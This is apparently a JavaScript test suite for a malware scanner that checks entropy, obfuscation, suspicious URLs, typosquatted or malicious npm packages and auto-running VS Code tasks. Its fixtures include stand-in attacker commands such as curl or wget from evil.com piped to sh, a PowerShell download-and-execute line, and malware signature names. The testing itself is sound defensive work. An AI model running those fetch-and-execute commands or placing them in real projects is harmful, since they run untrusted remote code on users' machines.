const assert = require('assert');
const path = require('path');

// Source imports (compiled JS from out/)
const Severity = require('../../out/scanner/models/severity');
const { shannonEntropy, findHighEntropyStrings } = require('../../out/scanner/analyzers/entropy-analyzer');
const { extractStringLiterals, countHexStrings, countBase64Strings, countEvalUsage, countExecUsage, detectStringArrayObfuscation } = require('../../out/scanner/analyzers/string-analyzer');
const { extractUrls, findSuspiciousUrls, findPipedExecution } = require('../../out/scanner/analyzers/url-analyzer');
const { checkTyposquat } = require('../../out/scanner/analyzers/typosquat-analyzer');
const { executeRule } = require('../../out/rules/rule-engine');
const { RuleLoader } = require('../../out/rules/rule-loader');
const { runSignatureEngine } = require('../../out/scanner/engines/signature-engine');
const { runHeuristicEngine } = require('../../out/scanner/engines/heuristic-engine');
const { runNpmAuditEngine } = require('../../out/scanner/engines/npm-audit-engine');
const { runVscodeTaskEngine } = require('../../out/scanner/engines/vscode-task-engine');
const { Scanner } = require('../../out/scanner/scanner');
const { LlmCache } = require('../../out/llm/llm-cache');
const { createEmptySummary } = require('../../out/scanner/models/scan-result');

suite('Severity Helpers', () => {
  test('CRITICAL = 0', () => {
    assert.strictEqual(Severity.Severity.CRITICAL, 0);
  });

  test('HIGH = 1', () => {
    assert.strictEqual(Severity.Severity.HIGH, 1);
  });

  test('MEDIUM = 2', () => {
    assert.strictEqual(Severity.Severity.MEDIUM, 2);
  });

  test('LOW = 3', () => {
    assert.strictEqual(Severity.Severity.LOW, 3);
  });

  test('INFO = 4', () => {
    assert.strictEqual(Severity.Severity.INFO, 4);
  });

  test('severityToString for each value', () => {
    assert.strictEqual(Severity.severityToString(0), 'critical');
    assert.strictEqual(Severity.severityToString(1), 'high');
    assert.strictEqual(Severity.severityToString(2), 'medium');
    assert.strictEqual(Severity.severityToString(3), 'low');
    assert.strictEqual(Severity.severityToString(4), 'info');
  });

  test('stringToSeverity for each string', () => {
    assert.strictEqual(Severity.stringToSeverity('critical'), Severity.Severity.CRITICAL);
    assert.strictEqual(Severity.stringToSeverity('high'), Severity.Severity.HIGH);
    assert.strictEqual(Severity.stringToSeverity('medium'), Severity.Severity.MEDIUM);
    assert.strictEqual(Severity.stringToSeverity('low'), Severity.Severity.LOW);
    assert.strictEqual(Severity.stringToSeverity('info'), Severity.Severity.INFO);
  });

  test('stringToSeverity case-insensitive', () => {
    assert.strictEqual(Severity.stringToSeverity('Critical'), Severity.Severity.CRITICAL);
    assert.strictEqual(Severity.stringToSeverity('HIGH'), Severity.Severity.HIGH);
  });

  test('stringToSeverity unknown returns INFO', () => {
    assert.strictEqual(Severity.stringToSeverity('unknown'), Severity.Severity.INFO);
    assert.strictEqual(Severity.stringToSeverity(''), Severity.Severity.INFO);
  });
});

suite('Shannon Entropy', () => {
  test('empty string returns 0', () => {
    assert.strictEqual(shannonEntropy(''), 0);
  });

  test('single char returns 0', () => {
    assert.strictEqual(shannonEntropy('a'), 0);
  });

  test('uniform string "aaaa" returns 0', () => {
    assert.strictEqual(shannonEntropy('aaaa'), 0);
  });

  test('"abcd" returns exactly 2', () => {
    assert.strictEqual(shannonEntropy('abcd'), 2);
  });

  test('mixed string has entropy between 0 and log2(unique)', () => {
    const ent = shannonEntropy('aabbc');
    assert(ent > 0);
    assert(ent < 3.5);
  });

  test('findHighEntropyStrings finds strings above threshold', () => {
    const content = '"\\x41\\x23\\x8f\\x9a\\x1b\\x7c\\x3d\\x5e\\x6f\\x8a\\x9b\\x1c\\x2d\\x3e\\x4f\\x5a"';
    const results = findHighEntropyStrings(content, 3, 5);
    assert(results.length > 0, 'Should find high-entropy strings');
  });

  test('findHighEntropyStrings return empty for clean content', () => {
    const results = findHighEntropyStrings('"hello world"', 5, 5);
    assert(results.length === 0, 'Clean content should not trigger high entropy');
  });
});

suite('String Analyzer', () => {
  test('extractStringLiterals finds quoted strings', () => {
    const literals = extractStringLiterals('"hello" + "world"');
    assert.strictEqual(literals.length, 2);
    assert.strictEqual(literals[0].value, 'hello');
    assert.strictEqual(literals[1].value, 'world');
  });

  test('countHexStrings with 0 long hex', () => {
    assert.strictEqual(countHexStrings('short hex'), 0);
  });

  test('countHexStrings with long hex string', () => {
    const hex = '4a6f686e446f654672616e6b6c696e4d78617374726f6e676f76616e64657175';
    const count = countHexStrings(hex);
    assert(count >= 1, 'Should find long hex string');
  });

  test('countBase64Strings with 0', () => {
    assert.strictEqual(countBase64Strings(''), 0);
  });

  test('countBase64Strings with long base64', () => {
    const b64 = 'SGVsbG8gV29ybGQgVGhpcyBJcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmc'.repeat(2);
    const count = countBase64Strings(b64);
    assert(count >= 1, 'Should find long base64 string');
  });

  test('countEvalUsage with 0 eval calls', () => {
    assert.strictEqual(countEvalUsage('no eval here'), 0);
  });

  test('countEvalUsage with 1 eval', () => {
    assert.strictEqual(countEvalUsage('eval("code")'), 1);
  });

  test('countEvalUsage with 2 evals', () => {
    assert.strictEqual(countEvalUsage('eval("a"); eval("b")'), 2);
  });

  test('countExecUsage with 0 execs', () => {
    assert.strictEqual(countExecUsage('clean code'), 0);
  });

  test('countExecUsage with multiple exec', () => {
    const code = 'exec("a"); exec("b"); spawn("c");';
    const count = countExecUsage(code);
    assert(count >= 3, 'Should find multiple exec/spawn calls');
  });

  test('detectStringArrayObfuscation true for 15+ elements', () => {
    const arr = '["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p"];';
    assert.strictEqual(detectStringArrayObfuscation(arr), true);
  });

  test('detectStringArrayObfuscation false for small array', () => {
    const small = '["a","b","c"];';
    assert.strictEqual(detectStringArrayObfuscation(small), false);
  });
});

suite('URL Analyzer', () => {
  test('extractUrls finds http/https URLs', () => {
    const urls = extractUrls('const url = "https://example.com/api";');
    assert(urls.length >= 1);
    assert(urls[0].url.includes('example.com'));
  });

  test('extractUrls ignores non-url strings', () => {
    const urls = extractUrls('no urls here');
    assert.strictEqual(urls.length, 0);
  });

  test('findSuspiciousUrls catches suspicious domains', () => {
    const findings = findSuspiciousUrls('const u = "https://malware.vercel.app/payload"');
    assert(findings.length > 0);
  });

  test('findSuspiciousUrls catches raw IP addresses', () => {
    const findings = findSuspiciousUrls('const u = "http://192.168.1.100/payload"');
    assert(findings.length > 0);
  });

  test('findSuspiciousUrls ignores 127.0.0.1', () => {
    const findings = findSuspiciousUrls('const u = "http://127.0.0.1:3000/local"');
    assert.strictEqual(findings.length, 0);
  });

  test('findSuspiciousUrls ignores known-safe ip 0.0.0.0', () => {
    const findings = findSuspiciousUrls('const u = "http://0.0.0.0:8080/local"');
    assert.strictEqual(findings.length, 0);
  });

  test('findPipedExecution finds curl | sh', () => {
    const results = findPipedExecution('curl http://evil.com/shell.sh | sh');
    assert(results.length > 0);
  });

  test('findPipedExecution returns empty for clean code', () => {
    const results = findPipedExecution('const x = 1 + 2');
    assert.strictEqual(results.length, 0);
  });
});

suite('Typosquat Analyzer', () => {
  test('exact match not suspicious', () => {
    const result = checkTyposquat('react');
    assert.strictEqual(result.isSuspicious, false);
  });

  test('1-char difference suspicious', () => {
    const result = checkTyposquat('atios');
    assert.strictEqual(result.isSuspicious, true);
    assert.strictEqual(result.similarTo, 'axios');
    assert.strictEqual(result.distance, 1);
  });

  test('2-char difference suspicious', () => {
    const result = checkTyposquat('acdios');
    assert.strictEqual(result.isSuspicious, true);
    assert.strictEqual(result.similarTo, 'axios');
    assert.strictEqual(result.distance, 2);
  });

  test('3-char difference NOT suspicious', () => {
    const result = checkTyposquat('xyzaxiox');
    assert.strictEqual(result.isSuspicious, false);
  });

  test('short name not flagged', () => {
    const result = checkTyposquat('ax');
    assert.strictEqual(result.isSuspicious, false);
  });

  test('unknown long name not flagged', () => {
    const result = checkTyposquat('myunique-package');
    assert.strictEqual(result.isSuspicious, false);
  });
});

suite('Rule Engine', () => {
  test('string matcher exact match', () => {
    const rule = {
      id: 'test-string',
      name: 'Test String',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'malware' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    const threat = executeRule(rule, 'const x = "this has malware"', 'test.js');
    assert(threat !== null, 'Should match string');
    assert.strictEqual(threat.ruleId, 'test-string');
  });

  test('string matcher no match', () => {
    const rule = {
      id: 'test-string-no',
      name: 'Test No Match',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'nonexistent_pattern_xyz' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    const threat = executeRule(rule, 'clean code here', 'test.js');
    assert.strictEqual(threat, null);
  });

  test('regex matcher with match', () => {
    const rule = {
      id: 'test-regex',
      name: 'Test Regex',
      severity: 'medium',
      matchers: [{ id: 'm1', type: 'regex', pattern: 'eval\\s*\\(' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    const threat = executeRule(rule, 'eval("bad")', 'test.js');
    assert(threat !== null, 'Should match regex');
  });

  test('string-any with one match', () => {
    const rule = {
      id: 'test-any',
      name: 'Test StringAny',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string-any', patterns: ['beavertail', 'invisibleferret', 'ottercookie'] }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    const threat = executeRule(rule, '// loading beavertail module', 'test.js');
    assert(threat !== null, 'Should match one of the patterns');
  });

  test('condition: all - all matchers must match', () => {
    const rule = {
      id: 'test-all',
      name: 'Test All Condition',
      severity: 'high',
      matchers: [
        { id: 'm1', type: 'string', pattern: 'require' },
        { id: 'm2', type: 'string', pattern: 'child_process' },
      ],
      condition: { type: 'all', of: ['m1', 'm2'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    // Both patterns present
    assert(executeRule(rule, 'require("child_process")', 'test.js') !== null);
    // Only one pattern
    assert(executeRule(rule, 'require("something")', 'test.js') === null);
  });

  test('condition: threshold - minimum met', () => {
    const rule = {
      id: 'test-thresh',
      name: 'Test Threshold',
      severity: 'high',
      matchers: [
        { id: 'm1', type: 'string', pattern: 'eval' },
        { id: 'm2', type: 'string', pattern: 'exec' },
        { id: 'm3', type: 'string', pattern: 'spawn' },
      ],
      condition: { type: 'threshold', of: ['m1', 'm2', 'm3'], minimum: 2 },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    assert(executeRule(rule, 'eval(); exec(); spawn();', 'test.js') !== null);
    assert(executeRule(rule, 'eval(); exec();', 'test.js') !== null);
    assert(executeRule(rule, 'eval();', 'test.js') === null);
  });

  test('appliesTo not matching file extension returns null', () => {
    const rule = {
      id: 'test-applies',
      name: 'Test AppliesTo',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'malware' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    };
    assert.strictEqual(executeRule(rule, 'contains malware', 'test.txt'), null);
  });

  test('full execution returns Threat with all fields', () => {
    const rule = {
      id: 'test-full',
      name: 'Full Test',
      description: 'Full test description',
      severity: 'critical',
      confidence: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'malware' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
      mitre: { tactic: 'Execution', technique: 'T1059', name: 'Command and Scripting Interpreter' },
      remediation: { message: 'Fix it', actions: ['remove-dangerous-code'] },
    };
    const threat = executeRule(rule, 'const malware = 1', 'test.js');
    assert(threat !== null);
    assert.strictEqual(threat.ruleId, 'test-full');
    assert.strictEqual(threat.ruleName, 'Full Test');
    assert(threat.message === 'Full test description' || threat.message.length > 0);
    assert(threat.remediation !== undefined);
  });
});

suite('Heuristic Engine', () => {
  test('clean JS file returns empty', () => {
    const threats = runHeuristicEngine('const x = 1;', 'code.js');
    assert(threats.length === 0, 'Clean code should have no threats');
  });

  test('2+ eval() triggers eval density', () => {
    const threats = runHeuristicEngine('eval("a"); eval("b"); eval("c");', 'code.js');
    const evalThreat = threats.find(t => t.ruleId === 'heuristic-eval-density');
    assert(evalThreat !== undefined, 'Should have eval density threat');
    assert.strictEqual(evalThreat.severity, Severity.Severity.MEDIUM);
  });

  test('5+ exec triggers exec density', () => {
    const threats = runHeuristicEngine('exec("a"); execSync("b"); spawn("c"); spawnSync("d"); exec("e"); execSync("f");', 'code.js');
    const execThreat = threats.find(t => t.ruleId === 'heuristic-exec-density');
    assert(execThreat !== undefined, 'Should have exec density threat');
  });

  test('long hex strings trigger hex payload', () => {
    const hex1 = '4a6f686e446f654672616e6b6c696e4d78617374726f6e676f76616e64657175';
    const hex2 = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
    const threats = runHeuristicEngine(hex1 + ' ' + hex2, 'code.js');
    const hexThreat = threats.find(t => t.ruleId === 'heuristic-hex-payload');
    assert(hexThreat !== undefined, 'Should detect hex payload');
  });

  test('2+ long base64 strings trigger b64 payload', () => {
    const b64a = 'SGVsbG8gV29ybGQgVGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmc';
    const b64b = 'VGhpcyBpcyBhbm90aGVyIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIGZvciB0ZXN0aW5n';
    const threats = runHeuristicEngine(b64a + ' ' + b64b, 'code.js');
    const b64Threat = threats.find(t => t.ruleId === 'heuristic-b64-payload');
    assert(b64Threat !== undefined, 'Should detect base64 payload');
  });

  test('15+ element string array triggers obfuscation', () => {
    const arr = '["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p"];';
    const threats = runHeuristicEngine(arr, 'code.js');
    const obsThreat = threats.find(t => t.ruleId === 'heuristic-string-obfuscation');
    assert(obsThreat !== undefined, 'Should detect string array obfuscation');
  });

  test('file with .json extension returns empty', () => {
    const threats = runHeuristicEngine('eval("bad"); eval("worse");', 'data.json');
    assert(threats.length === 0, 'Non-code files should return empty');
  });
});

suite('npm Audit Engine', () => {
  test('non-package.json filename returns empty', () => {
    const threats = runNpmAuditEngine('{"name": "test"}', 'not-package.json');
    assert(threats.length === 0);
  });

  test('valid JSON without malicious deps', () => {
    const pkg = JSON.stringify({
      name: 'safe-project',
      dependencies: { 'express': '^4.18.0' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    assert(threats.length === 0, 'Clean dependencies should have no threats');
  });

  test('axios@1.14.1 triggers critical threat', () => {
    const pkg = JSON.stringify({
      name: 'test',
      dependencies: { 'axios': '1.14.1' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    const axiosThreat = threats.find(t => t.ruleId === 'npm-known-bad-package' && t.message.includes('axios'));
    assert(axiosThreat !== undefined, 'Should flag known malicious axios');
    assert.strictEqual(axiosThreat.severity, Severity.Severity.CRITICAL);
  });

  test('plain-crypto-js triggers critical threat', () => {
    const pkg = JSON.stringify({
      name: 'test',
      devDependencies: { 'plain-crypto-js': '^1.0.0' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    const cryptoThreat = threats.find(t => t.message.includes('plain-crypto-js'));
    assert(cryptoThreat !== undefined, 'Should flag plain-crypto-js');
    assert.strictEqual(cryptoThreat.severity, Severity.Severity.CRITICAL);
  });

  test('trvy typosquat package triggers threat', () => {
    const pkg = JSON.stringify({
      name: 'test',
      dependencies: { 'trvy': '^0.30.0' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    const trvyThreat = threats.find(t => t.message.includes('trvy'));
    assert(trvyThreat !== undefined, 'Should flag trvy');
  });

  test('suspicious postinstall script triggers threat', () => {
    const pkg = JSON.stringify({
      name: 'test',
      scripts: { postinstall: 'curl http://evil.com/payload.sh | sh' },
      dependencies: { 'express': '^4.18.0' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    const scriptThreat = threats.find(t => t.ruleId === 'npm-suspicious-script');
    assert(scriptThreat !== undefined, 'Should flag suspicious postinstall');
  });

  test('recent malicious packages trigger critical threats', () => {
    const pkg = JSON.stringify({
      name: 'test',
      dependencies: {
        'html-to-gutenberg': '^1.2.0',
        'period-newline': '^0.0.2',
      },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    const htmlThreat = threats.find(t => t.message.includes('html-to-gutenberg'));
    const periodThreat = threats.find(t => t.message.includes('period-newline'));
    assert(htmlThreat !== undefined, 'Should flag html-to-gutenberg');
    assert(periodThreat !== undefined, 'Should flag period-newline');
  });

  test('clean package.json with scripts returns no threats', () => {
    const pkg = JSON.stringify({
      name: 'clean-project',
      scripts: { 'start': 'node index.js', 'test': 'mocha' },
      dependencies: { 'express': '^4.18.0' },
    });
    const threats = runNpmAuditEngine(pkg, 'package.json');
    assert(threats.length === 0, 'Clean project should have no threats');
  });
});

suite('VS Code Task Engine', () => {
  test('non-tasks.json filename returns empty', () => {
    const threats = runVscodeTaskEngine('{"version":"2.0.0"}', 'other.json');
    assert(threats.length === 0);
  });

  test('invalid JSON returns empty', () => {
    const threats = runVscodeTaskEngine('not json', 'tasks.json');
    assert(threats.length === 0);
  });

  test('folderOpen triggers critical threat', () => {
    const content = JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Test', command: 'echo', runOptions: { runOn: 'folderOpen' } }],
    });
    const threats = runVscodeTaskEngine(content, 'tasks.json');
    const autoExec = threats.find(t => t.ruleId === 'vscode-task-autoexec');
    assert(autoExec !== undefined, 'Should detect auto-execute');
    assert.strictEqual(autoExec.severity, Severity.Severity.CRITICAL);
  });

  test('curl in command triggers high threat', () => {
    const content = JSON.parse(JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Test', command: 'curl http://evil.com/shell.sh' }],
    }));
    const json = JSON.stringify(content);
    const threats = runVscodeTaskEngine(json, 'tasks.json');
    const curlThreat = threats.find(t => t.ruleId === 'vscode-task-dangerous-cmd');
    assert(curlThreat !== undefined, 'Should detect curl command');
    assert.strictEqual(curlThreat.severity, Severity.Severity.HIGH);
  });

  test('Invoke-Expression triggers critical threat', () => {
    const content = JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Test', command: 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com")' }],
    });
    const threats = runVscodeTaskEngine(content, 'tasks.json');
    const iexThreat = threats.find(t => t.ruleId === 'vscode-task-dangerous-cmd');
    assert(iexThreat !== undefined, 'Should detect Invoke-Expression');
  });

  test('install-extension command triggers high threat', () => {
    const content = JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Install', command: 'code --install-extension evil.hidden' }],
    });
    const threats = runVscodeTaskEngine(content, 'tasks.json');
    const installThreat = threats.find(t => t.ruleId === 'vscode-task-dangerous-cmd');
    assert(installThreat !== undefined, 'Should detect extension install command');
  });

  test('piped shell execution triggers critical threat', () => {
    const content = JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Test', command: 'curl http://evil.com/payload | sh' }],
    });
    const threats = runVscodeTaskEngine(content, 'tasks.json');
    const pipeThreat = threats.find(t => t.ruleId === 'vscode-task-piped-exec');
    assert(pipeThreat !== undefined, 'Should detect pipe to shell');
    assert.strictEqual(pipeThreat.severity, Severity.Severity.CRITICAL);
  });

  test('URL shortener triggers high threat', () => {
    const content = JSON.parse(JSON.stringify({
      version: '2.0.0',
      tasks: [{ label: 'Test', command: 'wget http://bit.ly/evil' }],
    }));
    const json = JSON.stringify(content);
    const threats = runVscodeTaskEngine(json, 'tasks.json');
    const shortThreat = threats.find(t => t.ruleId === 'vscode-task-shortener');
    assert(shortThreat !== undefined, 'Should detect URL shortener');
  });
});

suite('Signatures Engine', () => {
  test('empty rules array returns empty', () => {
    const threats = runSignatureEngine('any content', 'test.js', []);
    assert(threats.length === 0);
  });

  test('rules that match content return threats', () => {
    const rules = [{
      id: 'sig-test',
      name: 'Signature Test',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'beavertail' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    }];
    const threats = runSignatureEngine('loading beavertail...', 'test.js', rules);
    assert(threats.length > 0, 'Should find matching threats');
  });

  test('rules that don\'t match return empty', () => {
    const rules = [{
      id: 'sig-no',
      name: 'No Match',
      severity: 'high',
      matchers: [{ id: 'm1', type: 'string', pattern: 'NONEXISTENT_PATTERN_XYZ' }],
      condition: { type: 'any', of: ['m1'] },
      appliesTo: { filePatterns: ['**/*.js'] },
    }];
    const threats = runSignatureEngine('clean code', 'test.js', rules);
    assert(threats.length === 0);
  });
});

suite('Scanner Rule Loading', () => {
  test('loads only enabled built-in rule sets', () => {
    const scanner = new Scanner();
    const rulesDir = path.resolve(__dirname, '..', '..', 'rules');
    const result = scanner.loadRules(rulesDir, undefined, ['stealth']);
    assert(result.count >= 2, 'Expected stealth rules to load');
    const ruleIds = scanner.getRules().map(rule => rule.id);
    assert(ruleIds.includes('stealth-blockchain-dead-drop'));
    assert(ruleIds.includes('stealth-unicode-obfuscation'));
    assert(!ruleIds.includes('vscode-task-abuse'));
  });
});

suite('LLM Cache', () => {
  test('new cache is empty', () => {
    const cache = new LlmCache();
    assert.strictEqual(cache.size, 0);
  });

  test('set then get returns value', () => {
    const cache = new LlmCache();
    const result = {
      malicious: true,
      confidence: 0.9,
      threats: [],
      summary: 'test',
      rawResponse: 'response',
      model: 'test-model',
      durationMs: 100,
      fromCache: false,
    };
    cache.set('content', 'profile', result);
    const cached = cache.get('content', 'profile');
    assert(cached !== null, 'Should return cached result');
    assert.strictEqual(cached.malicious, true);
    assert.strictEqual(cached.fromCache, true);
  });

  test('get with different profile returns null', () => {
    const cache = new LlmCache();
    cache.set('content', 'profile-a', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    const cached = cache.get('content', 'profile-b');
    assert.strictEqual(cached, null, 'Different profile should not hit cache');
  });

  test('get after TTL expiry returns null', () => {
    const originalNow = Date.now;
    let controlledTime = Date.now();
    Date.now = () => controlledTime;
    const cache = new LlmCache(50, 0.001);
    cache.set('c', 'p', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    controlledTime += 200; // exceed 1ms TTL
    const cached = cache.get('c', 'p');
    Date.now = originalNow;
    assert.strictEqual(cached, null, 'Expired cache entry should return null');
  });

  test('cache eviction LRU', () => {
    const cache = new LlmCache(2);
    cache.set('a', 'p', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    cache.set('b', 'p', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    cache.set('c', 'p', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    assert.strictEqual(cache.size, 2, 'Should evict oldest entry');
  });

  test('clear empties cache', () => {
    const cache = new LlmCache();
    cache.set('content', 'p', { malicious: false, confidence: 0, threats: [], summary: '', rawResponse: '', model: '', durationMs: 0, fromCache: false });
    cache.clear();
    assert.strictEqual(cache.size, 0);
  });
});

suite('Scan Result Models', () => {
  test('createEmptySummary has all zeros', () => {
    const summary = createEmptySummary();
    assert.strictEqual(summary.totalFiles, 0);
    assert.strictEqual(summary.scannedFiles, 0);
    assert.strictEqual(summary.skippedFiles, 0);
    assert.strictEqual(summary.totalThreats, 0);
    assert.strictEqual(summary.durationMs, 0);
    assert(Array.isArray(summary.results) && summary.results.length === 0);
  });

  test('threatsBySeverity has all 5 severity keys', () => {
    const summary = createEmptySummary();
    assert(summary.threatsBySeverity.hasOwnProperty('critical'));
    assert(summary.threatsBySeverity.hasOwnProperty('high'));
    assert(summary.threatsBySeverity.hasOwnProperty('medium'));
    assert(summary.threatsBySeverity.hasOwnProperty('low'));
    assert(summary.threatsBySeverity.hasOwnProperty('info'));
  });
});
